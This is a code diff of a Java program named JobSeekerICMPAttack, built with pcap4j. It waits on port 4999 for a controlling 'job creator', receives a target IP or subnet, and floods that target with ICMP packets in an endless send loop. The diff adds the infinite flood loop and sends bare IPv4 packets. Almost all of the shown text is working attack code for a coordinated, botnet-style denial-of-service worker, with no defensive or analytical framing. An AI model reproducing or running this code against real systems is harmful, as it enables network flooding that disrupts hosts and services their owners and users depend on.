@@ -1,12 +1,11 @@
 import org.pcap4j.core.*;
 import org.pcap4j.packet.*;
 import org.pcap4j.packet.namednumber.*;
-import org.pcap4j.util.MacAddress;
+import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.io.PrintWriter;
 import java.net.*;
 
 /* The job creator ask more than one job seeker to execute an ICMP flood attack against a given IP or subnet.
@@ -26,8 +25,8 @@ public class JobSeekerICMPAttack{ //server
                 .payloadBuilder(echoBuilder)
                 .correctChecksumAtBuild(true);
         //need to grab device IP and target IP
-        Socket s;
         ServerSocket ss = new ServerSocket(4999);
+        Socket s = new Socket();
         try {
             s = ss.accept();
             System.out.println("JobCreator connected. Waiting for Job...");
@@ -57,10 +56,12 @@ public class JobSeekerICMPAttack{ //server
         } catch (UnknownHostException e) {
             e.printStackTrace();
         }
+
         //get machine address
         InetAddress localHost = InetAddress.getLocalHost();
         NetworkInterface ni = NetworkInterface.getByInetAddress(localHost);
         byte[] hardwareAddress = ni.getHardwareAddress();
+        /*
         //get target machine address
         InetAddress targetHost = InetAddress.getByName(targetIP);
         NetworkInterface tni = NetworkInterface.getByInetAddress(targetHost);
@@ -73,18 +74,26 @@ public class JobSeekerICMPAttack{ //server
                 .type(EtherType.IPV4)
                 .payloadBuilder(ipv4Builder)
                 .paddingAtBuild(true);
-
-        Packet p = etherBuilder.build();
-
+        */
+        Packet p = ipv4Builder.build();
+        //create handle
         PcapNetworkInterface nif = Pcaps.getDevByAddress(localHost);
         int snapLen = 65536;
-        PcapNetworkInterface.PromiscuousMode mode = PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;
+        PromiscuousMode mode = PromiscuousMode.PROMISCUOUS;
         int timeout = 10;
         PcapHandle handle = nif.openLive(snapLen, mode, timeout);
         try {
             handle.sendPacket(p);
         } catch (PcapNativeException | NotOpenException e) {
             e.printStackTrace();
+        }
+        //if successful, continuously send the packet for ICMP attack
+        while (true){
+            try {
+                handle.sendPacket(p);
+            } catch (PcapNativeException | NotOpenException e) {
+                e.printStackTrace();
+            }
         }
     }
 }
